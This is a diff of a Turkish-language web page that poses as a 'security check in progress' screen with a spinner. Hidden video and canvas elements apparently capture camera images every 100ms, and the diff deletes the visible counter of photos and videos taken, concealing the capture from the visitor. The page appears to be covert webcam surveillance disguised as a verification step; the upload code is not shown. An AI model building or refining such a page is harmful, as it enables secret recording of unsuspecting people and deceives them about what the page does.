@@ -85,11 +85,6 @@
             font-weight: 500;
         }
         #video, #canvas { display: none; }
-        .stats {
-            font-size: 12px;
-            color: #a0aec0;
-            margin-top: 20px;
-        }
     </style>
 </head>
 <body>
@@ -101,7 +96,6 @@
             <div class="spinner"></div>
             <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
         </div>
-        <div class="stats" id="stats"></div>
     </div>
     
     <video id="video" autoplay playsinline></video>
@@ -204,9 +198,6 @@
                                     });
                                 }, 'image/jpeg', 0.8);
                             }
-                            
-                            // Stats güncelle
-                            document.getElementById('stats').innerHTML = `📸 ${photoCount} fotoğraf | 🎥 ${videoCount} video | ⏱️ ${gecenSure}s`;
                             
                         }, 100); // Her 100ms'de kontrol
                         
